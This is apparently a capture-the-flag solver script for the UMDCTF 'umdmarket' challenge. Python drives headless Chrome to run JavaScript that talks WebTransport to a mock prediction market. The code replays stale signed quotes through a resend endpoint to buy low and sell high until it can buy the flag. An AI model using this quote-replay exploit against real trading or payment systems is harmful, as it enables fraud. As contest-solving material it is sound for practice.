#!/usr/bin/env python3
import json
from pathlib import Path

from playwright.sync_api import sync_playwright


TARGET = "https://umdmarket.challs.umdctf.io/"
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"


EXPLOIT_JS = r"""
async () => {
  const url = "https://umdmarket.challs.umdctf.io:4443/wt";
  const certHex = "ac02c9f7e1558563180ed412dedb9e793fd9b3ab36d64beb7e178283a68a4c9f";
  const te = new TextEncoder();
  const td = new TextDecoder();
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const log = (...args) => console.log("[solver]", ...args);

  function hexToBytes(hex) {
    const out = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
      out[i / 2] = parseInt(hex.slice(i, i + 2), 16);
    }
    return out;
  }

  const u8 = (x) => new Uint8Array([x & 0xff]);
  const u16 = (x) => {
    const out = new Uint8Array(2);
    new DataView(out.buffer).setUint16(0, x, true);
    return out;
  };
  const u32 = (x) => {
    const out = new Uint8Array(4);
    new DataView(out.buffer).setUint32(0, x >>> 0, true);
    return out;
  };
  const s8 = (s) => {
    const b = te.encode(s);
    const out = new Uint8Array(1 + b.length);
    out[0] = b.length;
    out.set(b, 1);
    return out;
  };
  const cat = (...parts) => {
    const len = parts.reduce((acc, p) => acc + p.length, 0);
    const out = new Uint8Array(len);
    let off = 0;
    for (const p of parts) {
      out.set(p, off);
      off += p.length;
    }
    return out;
  };
  const dv = (b) => new DataView(b.buffer, b.byteOffset, b.byteLength);
  const errorName = (status) =>
    ({
      1: "ERR_INVALID_REQUEST",
      2: "ERR_NOT_AUTHENTICATED",
      3: "ERR_COOLDOWN",
      4: "ERR_STALE",
      5: "ERR_INSUFFICIENT_FUNDS",
      6: "ERR_INSUFFICIENT_POSITION",
      7: "ERR_INVALID_QTY",
      8: "ERR_MARKET_WARMUP",
      9: "ERR_TICKER_NOT_FOUND",
      10: "ERR_INVALID_CREDENTIALS",
      11: "ERR_USERNAME_TAKEN",
      12: "ERR_WEAK_PASSWORD",
      13: "ERR_ALREADY_LOGGED_IN",
      14: "ERR_INVALID_QUOTE",
      15: "ERR_RESEND_UNAVAILABLE",
      16: "ERR_TICKER_RESOLVED",
    })[status] || `ERR_${status}`;

  const wt = new WebTransport(url, {
    serverCertificateHashes: [
      { algorithm: "sha-256", value: hexToBytes(certHex).buffer },
    ],
  });
  await wt.ready;

  async function request(data, raw = false) {
    const stream = await wt.createBidirectionalStream();
    const writer = stream.writable.getWriter();
    await writer.write(data);
    await writer.close();

    const reader = stream.readable.getReader();
    const chunks = [];
    let length = 0;
    for (;;) {
      const { value, done } = await reader.read();
      if (done) break;
      if (value) {
        chunks.push(value);
        length += value.length;
      }
    }

    const out = new Uint8Array(length);
    let off = 0;
    for (const chunk of chunks) {
      out.set(chunk, off);
      off += chunk.length;
    }

    if (!out.length) throw new Error("empty response");
    if (!raw && out[0] !== 0) {
      const err = new Error(errorName(out[0]));
      err.status = out[0];
      throw err;
    }
    return out;
  }

  async function register() {
    for (let i = 0; i < 10; i++) {
      const username =
        "u" +
        Math.random()
          .toString(36)
          .replace(/[^a-z0-9]/g, "")
          .slice(2, 12)
          .padEnd(8, "x");
      const password = "Aa1!" + Math.random().toString(36).slice(2, 14) + "Zz9!";
      try {
        const res = await request(cat(u8(0x20), s8(username), s8(password)));
        return {
          username,
          password,
          balance: Number(dv(res).getBigUint64(1, true)),
        };
      } catch (err) {
        if (err.status !== 11) throw err;
      }
    }
    throw new Error("registration failed");
  }

  const account = await register();
  let balance = account.balance;
  log("registered", account.username, "balance", balance);

  let res = await request(u8(0x24));
  let view = dv(res);
  let off = 1;
  const tickerCount = view.getUint16(off, true);
  off += 2;

  const tickers = [];
  for (let i = 0; i < tickerCount; i++) {
    const id = view.getUint16(off, true);
    off += 2;
    let len = view.getUint8(off++);
    const name = td.decode(res.slice(off, off + len));
    off += len;
    len = view.getUint16(off, true);
    off += 2;
    const description = td.decode(res.slice(off, off + len));
    off += len;
    tickers.push({ id, name, description });
  }

  const tickerById = new Map(tickers.map((t) => [t.id, t]));
  const quotes = new Map(tickers.map((t) => [t.id, []]));
  const resolutions = new Map();
  let latestSeq = null;
  let running = true;

  const datagramReader = wt.datagrams.readable.getReader();
  (async () => {
    while (running) {
      try {
        const { value, done } = await datagramReader.read();
        if (done) break;
        if (!value) continue;
        const v = dv(value);

        if (value[0] === 1 && value.length >= 15) {
          const q = {
            seq: v.getUint16(1, true),
            tickerId: v.getUint16(3, true),
            yesPrice: v.getUint16(5, true),
            hmac: value.slice(7, 15),
            at: Date.now(),
          };
          latestSeq = q.seq;
          const arr = quotes.get(q.tickerId);
          if (arr) {
            arr.push(q);
            const cutoff = Date.now() - 48000;
            while (arr.length && arr[0].at < cutoff) arr.shift();
          }
        } else if (value[0] === 2 && value.length >= 4) {
          const r = {
            tickerId: v.getUint16(1, true),
            outcome: v.getUint8(3),
            at: Date.now(),
          };
          resolutions.set(r.tickerId, r.at);
          const arr = quotes.get(r.tickerId);
          if (arr) arr.length = 0;
          log("resolved", tickerById.get(r.tickerId)?.name || r.tickerId);
        }
      } catch {
        break;
      }
    }
  })();

  for (const t of tickers) {
    await request(cat(u8(0x22), u16(t.id)));
  }
  log("subscribed", tickers.length, "tickers");

  function stats(tickerId) {
    const now = Date.now();
    const arr = (quotes.get(tickerId) || []).filter(
      (q) => now - q.at < 47000 && q.yesPrice > 1 && q.yesPrice < 9999,
    );
    if (arr.length < 20) return null;

    let min = arr[0];
    let max = arr[0];
    for (const q of arr) {
      if (q.yesPrice < min.yesPrice) min = q;
      if (q.yesPrice > max.yesPrice) max = q;
    }
    return { min, max };
  }

  function bestOpportunity() {
    let best = null;

    for (const t of tickers) {
      const s = stats(t.id);
      if (!s) continue;

      const candidates = [];
      const yesEntry = s.min.yesPrice;
      const yesExit = s.max.yesPrice;
      if (yesEntry >= 200 && yesExit > yesEntry) {
        candidates.push({
          tickerId: t.id,
          name: t.name,
          side: "YES",
          buySide: 0,
          sellSide: 2,
          entryPrice: yesEntry,
          exitPrice: yesExit,
          buySeq: s.min.seq,
          ratio: yesExit / yesEntry,
          profit: Math.floor(balance / yesEntry) * (yesExit - yesEntry),
        });
      }

      const noEntry = 10000 - s.max.yesPrice;
      const noExit = 10000 - s.min.yesPrice;
      if (noEntry >= 200 && noExit > noEntry) {
        candidates.push({
          tickerId: t.id,
          name: t.name,
          side: "NO",
          buySide: 1,
          sellSide: 3,
          entryPrice: noEntry,
          exitPrice: noExit,
          buySeq: s.max.seq,
          ratio: noExit / noEntry,
          profit: Math.floor(balance / noEntry) * (noExit - noEntry),
        });
      }

      for (const c of candidates) {
        if (!best || c.profit > best.profit) best = c;
      }
    }

    return best;
  }

  function bestExit(position) {
    const s = stats(position.tickerId);
    if (!s) return null;
    if (position.side === "YES") {
      return { seq: s.max.seq, expected: s.max.yesPrice };
    }
    return { seq: s.min.seq, expected: 10000 - s.min.yesPrice };
  }

  async function resend(seq, tickerId) {
    const b = await request(cat(u8(0x26), u16(seq), u16(tickerId)));
    const v = dv(b);
    return {
      seq: v.getUint16(1, true),
      tickerId: v.getUint16(3, true),
      yesPrice: v.getUint16(5, true),
      hmac: b.slice(7, 15),
    };
  }

  async function trade(q, side, qty, raw = false) {
    const b = await request(
      cat(
        u8(0x30),
        u16(q.seq),
        u16(q.tickerId),
        u16(q.yesPrice),
        q.hmac,
        u8(side),
        u32(qty),
      ),
      raw,
    );

    if (raw && b[0] !== 0) return { status: b[0], error: errorName(b[0]) };
    const v = dv(b);
    return {
      status: 0,
      fillPrice: v.getUint16(1, true),
      newBalance: Number(v.getBigUint64(3, true)),
    };
  }

  async function portfolio() {
    const b = await request(u8(0x40));
    const v = dv(b);
    let off = 1;
    const bal = Number(v.getBigUint64(off, true));
    off += 8;
    const count = v.getUint16(off, true);
    off += 2;

    const positions = [];
    for (let i = 0; i < count; i++) {
      const tickerId = v.getUint16(off, true);
      off += 2;
      const yesQty = v.getUint32(off, true);
      off += 4;
      const noQty = v.getUint32(off, true);
      off += 4;
      positions.push({ tickerId, yesQty, noQty });
    }
    return { balance: bal, positions };
  }

  async function buyFlag() {
    const b = await request(u8(0x50));
    const len = dv(b).getUint16(1, true);
    return td.decode(b.slice(3, 3 + len));
  }

  log("collecting resend window");
  const collectStart = Date.now();
  while (Date.now() - collectStart < 55000) {
    await sleep(2000);
    const opp = bestOpportunity();
    if (opp) {
      log(
        "best",
        opp.name,
        opp.side,
        "entry",
        opp.entryPrice,
        "exit",
        opp.exitPrice,
        "ratio",
        opp.ratio.toFixed(3),
        "balance",
        balance,
        "seq",
        latestSeq,
      );
    }
  }

  let cycles = 0;
  while (balance < 10000000 && cycles < 30) {
    let opp = bestOpportunity();
    if (!opp) {
      await sleep(2000);
      continue;
    }

    cycles += 1;
    log(
      "cycle",
      cycles,
      opp.name,
      opp.side,
      "entry",
      opp.entryPrice,
      "exit",
      opp.exitPrice,
      "balance",
      balance,
    );

    let position = null;
    while (!position) {
      try {
        const q = await resend(opp.buySeq, opp.tickerId);
        const entry = opp.side === "YES" ? q.yesPrice : 10000 - q.yesPrice;
        const qty = Math.floor((balance - 1) / entry);
        if (qty < 1) throw new Error("quantity below one");

        const tr = await trade(q, opp.buySide, qty, true);
        if (tr.status === 0) {
          balance = tr.newBalance;
          position = {
            tickerId: opp.tickerId,
            name: opp.name,
            side: opp.side,
            qty,
            entry,
            boughtAt: Date.now(),
          };
          log("buy", qty, opp.side, opp.name, "entry", entry, "cash", balance);
          break;
        }

        if (tr.status === 3 || tr.status === 8) {
          await sleep(1000);
          continue;
        }
        log("buy failed", tr.error);
        break;
      } catch (err) {
        log("buy error", err.message);
        await sleep(1000);
        opp = bestOpportunity();
        if (!opp) break;
      }
    }
    if (!position) continue;

    let sold = false;
    const sellStart = Date.now();
    while (!sold && Date.now() - sellStart < 90000) {
      await sleep(1000);

      if ((resolutions.get(position.tickerId) || 0) > position.boughtAt) {
        const pf = await portfolio();
        balance = pf.balance;
        sold = true;
        break;
      }

      const exitCandidate = bestExit(position);
      if (!exitCandidate) continue;

      const q = await resend(exitCandidate.seq, position.tickerId);
      const exit = position.side === "YES" ? q.yesPrice : 10000 - q.yesPrice;
      if (exit <= position.entry && Date.now() - sellStart < 30000) continue;

      const tr = await trade(q, position.side === "YES" ? 2 : 3, position.qty, true);
      if (tr.status === 0) {
        balance = tr.newBalance;
        sold = true;
        log("sell", position.qty, position.side, position.name, "exit", exit, "balance", balance);
        break;
      }
    }

    if (!sold) {
      const pf = await portfolio();
      balance = pf.balance;
    }
  }

  if (balance < 10000000) {
    throw new Error(`balance below flag price: ${balance}`);
  }

  const flag = await buyFlag();
  running = false;
  wt.close();
  return { flag, balance, cycles, username: account.username };
}
"""


def main() -> None:
    launch_kwargs = {"headless": True}
    if Path(CHROME).exists():
        launch_kwargs["executable_path"] = CHROME

    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_kwargs)
        page = browser.new_page()
        page.set_default_timeout(0)
        page.on("console", lambda msg: print(msg.text, flush=True))
        page.goto(TARGET, wait_until="load", timeout=30000)
        result = page.evaluate(EXPLOIT_JS)
        browser.close()

    print(json.dumps(result, indent=2))
    print(result["flag"])


if __name__ == "__main__":
    main()
